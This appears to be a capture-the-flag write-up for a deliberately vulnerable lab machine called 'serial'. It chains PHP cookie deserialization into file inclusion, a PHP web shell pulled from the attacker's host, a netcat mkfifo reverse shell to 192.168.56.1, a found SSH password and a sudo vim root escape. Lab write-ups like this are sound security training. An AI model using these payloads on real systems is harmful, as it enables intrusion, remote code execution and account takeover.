## Nmap

![](images/serial/nmap.png)

hmm....seems like a machine with simple Stuff. Let's start with HTTP

***

## HTTP

![](images/serial/http.png)

Nothing fancy just a simple intro. What we notice is a special `Cookie` named `user` and message also talks about `cookie`. That cookie seemed like a base64 encoded cookie so let's just decode it to see what we find in it.

![](images/serial/decode.png)

```python
O:4:"User":2:{s:10:".User.name";s:3:"sk4";s:9:".User.wel";O:7:"Welcome":0:{}}
```
So obviously the very first thing that I would try is to change the name to something like `admin` or `root`.

__For encoding and decoding we can use Burp's decoded__

![](images/serial/encode.png)

And then send it with the request in the `user` cookie.

I did that but got `nothing`.

![](images/serial/nothing.png)

I tried with different names but none of them worked.

While I was doing this I ran `dirsearch` and it found a hidden directory.

![](images/serial/dirsearch.png)

When we visit that page we can see a `bak.zip` file.

![](images/serial/backup.png)

I downloaded the file and it had 3 other files showing the source of website.

* __user.class.php__

```php
<?php
  include("log.class.php");

  class Welcome {
    public function handler($val) {
      echo "Hello " . $val;
    }
  }

  class User {
    private $name;
    private $wel;

    function __construct($name) {
      $this->name = $name;
      $this->wel = new Welcome();
    }

    function __destruct() {
      //echo "bye\n";
      $this->wel->handler($this->name);
    }
  }
?>
```

* __log.class.php__

```php
<?php
  class Log {
    private $type_log;

    function __costruct($hnd) {
      $this->$type_log = $hnd;
    }

    public function handler($val) {
      include($this->type_log);
      echo "LOG: " . $val;
    }
  }
?>
```

* __index.php__

```php
<?php
    include("user.class.php");

    if(!isset($_COOKIE['user'])) {
        setcookie("user", base64_encode(serialize(new User('sk4'))));
    } else {
        unserialize(base64_decode($_COOKIE['user']));
    }
    echo "This is a beta test for new cookie handler\n";
?>
```

We can see that when we visit the wesbite we are shown the output present in `index.php` and it generate cookie for user name `sk4`.

If we look at the code in `user.class.php` it's calling the `Welcome` class but the `Log` class from `log.class.php` isn't called anywhere. So this is what I did, I edited the source to call the `Log class`.

To do so edit the `user.class.php` in the following manner

* In the `__construct` function change `$this->wel = new Welcome();` to `$this->wel = new Log();`
* In the end of the file right before `?>` add the following like `echo base64_encode(serialize(new User('admin')));`(you can use anyname you want)

So the code would become

```php
<?php
  include("log.class.php");
  class Welcome {
    public function handler($val) {
      echo "Hello " . $val;
    }
  }
  class User {
    private $name;
    private $wel;
    function __construct($name) {
      $this->name = $name;
      $this->wel = new Log();
    }
    function __destruct() {
      //echo "bye\n";
      $this->wel->handler($this->name);
    }
  }
echo base64_encode(serialize(new User('admin')));
?>
```
After I ran this code I got a base64 encoded string and some error.

![](images/serial/error.png)

Now if we focus on the error it says that the file to be included couldn't be found. DAMN!!!!!!
This is when it clicked the `log.class.php` is using `include()` to include a file. So If we can give it a file path says `/etc/passwd` and then generate the cookie and use that cookie it should include that file, showing us the content of it(I guess).

So I edited the `log.class.php` by editing the following line

* `private $type_log;` to `private $type_log = "/etc/passwd";`

![](images/serial/final-cook.png)

I used that cookie and BOOM!!! üí•üí•üí•üí•üí•

![](images/serial/lfi.png)

Now we can use RFI to exploit this. First we can run a python server that will have a file containing a shell and then we can include that.

I made a file name `shell` having the following content

```php
<? php
system($_GET['cmd']);
?>
```

Using `python -m http.server` I started the server now we can include that in our code.

```
Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6MTM6IgBMb2cAdHlwZV9sb2ciO3M6MzA6Imh0dHA6Ly8xOTIuMTY4LjU2LjE6ODAwMC9zaGVsbCI7fX0=
```

I used this cookie and I was able to execute command.

![](images/serial/rce.png)

Now we can simply get a shell. I used the OpenBSD netcat format which was URL encoded.

```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.56.1%201337%20%3E%2Ftmp%2Ff
```

![](images/serial/shell.png)

I started looking around and found `credential.txt.bak` in the `/` dir which had  credential for `sk4` user.

![](images/serial/creds.png)

`sk4:KywZmnPWW6tTbW5w`

Now we can use these creds to login via SSH.

***

## Privilege escalation

![](images/serial/ssh.png)

In the `sk4` directory I found `flag.txt`.

![](images/serial/user.png)

After this I ran the enumeration script to see if there's any SUID or any other interesting thing or not.

The enum script didn't gave anything but I found something good in `sudo` rights.

![](images/serial/sudo.png)

We can simply start `vim` by running `sudo vim` and then press `:` and execute the command `!bash` to get the root-shell.

![](images/serial/bash.png)

![](images/serial/root-shell.png)

Now we can just cat the root flag.

This was really nice machine with a very great foothold. Thanks to [@sk4](https://twitter.com/@sk4pwn) for this awesome machine.
